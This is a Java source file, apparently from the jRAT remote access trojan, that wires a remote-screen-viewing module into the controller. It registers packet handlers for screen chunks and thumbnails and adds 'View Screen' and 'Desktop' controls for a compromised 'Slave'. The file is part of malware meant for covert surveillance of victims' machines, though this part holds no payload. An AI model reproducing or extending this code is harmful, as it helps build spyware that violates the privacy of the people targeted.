package jrat.module.screen;

import jrat.api.ClientEventListener;
import jrat.api.ControllerModule;
import jrat.api.Resources;
import jrat.api.ui.*;
import jrat.controller.AbstractSlave;
import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPackets;
import jrat.module.screen.packets.PacketReceiveAllThumbnails;
import jrat.module.screen.packets.PacketRemoteScreenChunk;
import jrat.module.screen.packets.PacketRemoteScreenCompleted;
import jrat.module.screen.ui.PanelScreenController;

public class ScreenControllerModule extends ControllerModule {

    public void init() throws Exception {
        IncomingPackets.register((short) 68, PacketRemoteScreenCompleted.class);
        IncomingPackets.register((short) 71, PacketReceiveAllThumbnails.class);
        IncomingPackets.register((short) 26, PacketRemoteScreenChunk.class);

        menuItems.add(new ClientMenuItem(ClientMenu.Category.QUICK_OPEN,"View Screen", Resources.getIcon("desktop"), new ClientEventListener() {
            @Override
            public void emit(AbstractSlave slave) {
                new PanelScreenController((Slave) slave).displayFrame();
            }
        }));

        controlPanelItems.add(new ControlPanelTab(ControlPanel.Category.USER, "Desktop", Resources.getIcon("desktop"), PanelScreenController.class));
    }
}
